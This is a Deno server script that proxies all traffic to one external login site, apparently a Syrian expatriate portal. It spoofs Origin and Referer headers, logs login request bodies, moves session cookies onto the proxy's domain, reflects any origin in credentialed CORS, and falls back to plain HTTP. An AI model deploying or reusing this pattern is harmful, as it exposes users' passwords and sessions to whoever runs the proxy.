// server.ts — Deno Deploy compatible version of your Cloudflare Worker logic
const TARGET_HOST = "https://ecsc-expat.sy:8443";
const DEFAULT_FETCH_TIMEOUT = 9000; // ms
const TRY_HTTP_FALLBACK = true;

function escapeHtml(s: string) {
  return s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'} as any)[c]);
}

async function timeoutFetch(input: RequestInfo, init?: RequestInit, timeout = DEFAULT_FETCH_TIMEOUT) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);
  try {
    const res = await fetch(input, { ...(init || {}), signal: controller.signal });
    return res;
  } finally {
    clearTimeout(id);
  }
}

async function tryFetchWithFallback(init: RequestInit, targetUrlHttps: string) {
  try {
    console.log("Attempting fetch ->", targetUrlHttps);
    const r = await timeoutFetch(targetUrlHttps, init);
    return { resp: r, url: targetUrlHttps };
  } catch (err) {
    console.warn("HTTPS fetch failed:", String(err));
    if (TRY_HTTP_FALLBACK) {
      try {
        const u = new URL(targetUrlHttps);
        u.protocol = "http:";
        const httpUrl = u.toString();
        console.log("Attempting HTTP fallback ->", httpUrl);
        const r2 = await timeoutFetch(httpUrl, init);
        return { resp: r2, url: httpUrl };
      } catch (err2) {
        console.warn("HTTP fallback failed:", String(err2));
        const e = new Error(`Both https and http fetch failed. https error: ${String(err)}; http error: ${String(err2)}`);
        (e as any).cause = { httpsErr: err, httpErr: err2 };
        throw e;
      }
    }
    throw err;
  }
}

// remove Domain=... so cookie becomes host-only for our domain
function sanitizeSetCookie(sc: string) {
  const parts = sc.split(";").map(p => p.trim());
  const nameValue = parts.shift() || "";
  let expires: string | null = null;
  let maxAge: string | null = null;

  for (const p of parts) {
    const [k, ...rest] = p.split("=");
    const key = k.trim().toLowerCase();
    if (key === "expires") expires = `Expires=${rest.join("=")}`.trim();
    else if (key === "max-age") maxAge = `Max-Age=${rest.join("=")}`.trim();
    // ignore Domain, SameSite, Secure, HttpOnly, Path from upstream — we'll set ours
  }

  const out = [nameValue];
  if (expires) out.push(expires);
  if (maxAge) out.push(maxAge);
  out.push("Path=/");
  out.push("HttpOnly");
  out.push("SameSite=None");
  out.push("Secure");
  return out.join("; ");
}

function makeCorsPreflightResponse(originHeader?: string) {
  const origin = originHeader || "*";
  const headers = new Headers();
  headers.set("Access-Control-Allow-Origin", origin);
  headers.set("Access-Control-Allow-Methods", "GET,POST,PUT,DELETE,OPTIONS");
  headers.set("Access-Control-Allow-Headers", "*");
  headers.set("Access-Control-Allow-Credentials", "true");
  headers.set("Access-Control-Max-Age", "86400");
  return new Response(null, { status: 204, headers });
}

async function handler(req: Request): Promise<Response> {
  const origUrl = new URL(req.url);
  const targetUrl = new URL(TARGET_HOST);
  targetUrl.pathname = origUrl.pathname;
  targetUrl.search = origUrl.search;

  // OPTIONS preflight
  if (req.method === "OPTIONS") {
    const origin = req.headers.get("Origin") || "*";
    return makeCorsPreflightResponse(origin);
  }

  // clone and prepare headers
  const headers = new Headers(req.headers);

  // force headers as in your CF Worker
  try { headers.set("Host", targetUrl.hostname); } catch (_) {}
  headers.set("Origin", `https://${targetUrl.hostname}`);
  headers.set("Referer", `https://${targetUrl.hostname}${origUrl.pathname}`);
  headers.set("Sec-Fetch-Site", "same-site");
  headers.set("Sec-Fetch-Mode", "cors");
  headers.set("Sec-Fetch-Dest", "empty");
  headers.set("Alt-Used", targetUrl.hostname);

  console.log("Request Headers:", Object.fromEntries(headers.entries()));

  // read request body if present
  let requestBody: string | null = null;
  if (req.method !== "GET" && req.method !== "HEAD") {
    // clone to read body safely
    try {
      requestBody = await req.clone().text();
      console.log("Request Body:", requestBody);
    } catch (err) {
      console.warn("Failed to read request body:", String(err));
    }
  }

  // build proxied RequestInit
  const proxiedInit: RequestInit = {
    method: req.method,
    headers,
    redirect: "manual",
    body: ["GET", "HEAD"].includes(req.method) ? undefined : requestBody
  };

  // perform upstream request with fallback
  let upstream: Response;
  try {
    const { resp } = await tryFetchWithFallback(proxiedInit, targetUrl.toString());
    upstream = resp!;
  } catch (err) {
    console.error("Bad gateway:", String(err));
    const body = `Bad gateway: ${String(err)}`;
    return new Response(body, { status: 502 });
  }

  console.log("Response Headers:", Object.fromEntries(upstream.headers.entries()));
  const respBody = await upstream.clone().text().catch(()=>"");
  console.log("Response Body:", respBody);

  // collect all upstream Set-Cookie headers
  const originalSetCookies: string[] = [];
  for (const [k, v] of upstream.headers.entries()) {
    if (k.toLowerCase() === "set-cookie") originalSetCookies.push(v);
  }

  // prepare outgoing headers based on upstream (but we'll replace Set-Cookie handling)
  const newHeaders = new Headers(upstream.headers);
  // delete original set-cookie headers to avoid cross-domain domain attribute issues
  if (originalSetCookies.length > 0) {
    newHeaders.delete("set-cookie");
  }

  // If request path equals target login path (exact path), rewrite cookies and append them
  // NOTE: in your CF Worker you checked origUrl.pathname === '/secure/auth/login'
  if (origUrl.pathname === "/secure/auth/login" && originalSetCookies.length > 0) {
    for (const sc of originalSetCookies) {
      const sanitized = sanitizeSetCookie(sc);
      newHeaders.append("Set-Cookie", sanitized);
      console.log("Rewritten Set-Cookie:", sanitized);
    }
  }

  // CORS headers to allow credentials from caller origin
  const requestOrigin = req.headers.get("Origin");
  if (requestOrigin) {
    newHeaders.set("Access-Control-Allow-Origin", requestOrigin);
    newHeaders.set("Access-Control-Allow-Credentials", "true");
    newHeaders.set("Vary", "Origin");
  } else {
    newHeaders.set("Access-Control-Allow-Origin", "*");
    newHeaders.set("Access-Control-Allow-Credentials", "true");
  }
  newHeaders.set("Access-Control-Allow-Methods", "GET,POST,PUT,DELETE,OPTIONS");
  newHeaders.set("Access-Control-Allow-Headers", "*");
  newHeaders.set("Access-Control-Expose-Headers", "*");

  // return response body and headers (string body)
  return new Response(respBody, {
    status: upstream.status,
    statusText: upstream.statusText,
    headers: newHeaders
  });
}

// Start server via Deno.serve
const port = Number(Deno.env.get("PORT") || 8000);
console.log(`Starting Deno server — port ${port} — TARGET_HOST=${TARGET_HOST}`);
Deno.serve({ port }, handler);
